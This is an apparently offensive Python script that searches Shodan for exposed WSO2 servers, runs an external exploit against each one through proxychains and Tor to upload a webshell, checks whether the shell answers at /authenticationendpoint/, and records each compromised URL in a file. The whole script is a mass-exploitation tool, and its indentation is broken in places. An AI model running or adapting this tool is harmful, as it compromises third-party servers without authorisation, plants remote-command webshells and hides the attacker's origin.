import shodan
from shodan.cli.helpers import get_api_key
import sys
import os
import subprocess
import requests
import re

 

API_KEY = "YOUR API KEY" 
workingDir = "YOUR WORKING DIR"

webshellName = "YOUR WEBSHELL FILE"

exploitFile = "exploit.py"
http_proxy  = "socks5://127.0.0.1:9050"
https_proxy = "socks5://127.0.0.1:9050"
proxies = {
    "http"  : http_proxy,
    "https" : https_proxy
}

api = shodan.Shodan(API_KEY)

result = api.search("http.html:WSO2 port:9443")

# Loop through the matches and print each IP
for service in result['matches']:
    url = ""
    #The script does not yet allow to filter the right port. 
    # Need to add the check on services in order to get the right port	
    try:
	if service['ssl']:
        	url = "https://" + service['ip_str'].rstrip() + ":" + str(service['port'])	
	except:
		url = "http://" + service['ip_str'].rstrip() + ":" + str(service['port'])

    try:
        result = subprocess.Popen("proxychains python3 " + exploitFile +" "+ url + " " + webshellName, shell=True, stdout=subprocess.PIPE, cwd=workingDir)
        stdout = result.stdout.read().decode('utf-8')
        if re.search("authenticationendpoint",stdout):
            exploitUrl = url + "//authenticationendpoint/" + webshellName
            response = requests.get(exploitUrl, proxies=proxies, verify=False)
            if re.search('cmd', response.text):
                ipFile = open("ip.txt","a")
                ipFile.write(exploitUrl + "\n")
                print("success with url : " + exploitUrl)
                ipFile.close()

    except Exception as e:
            print('Error: %s' % e)
        
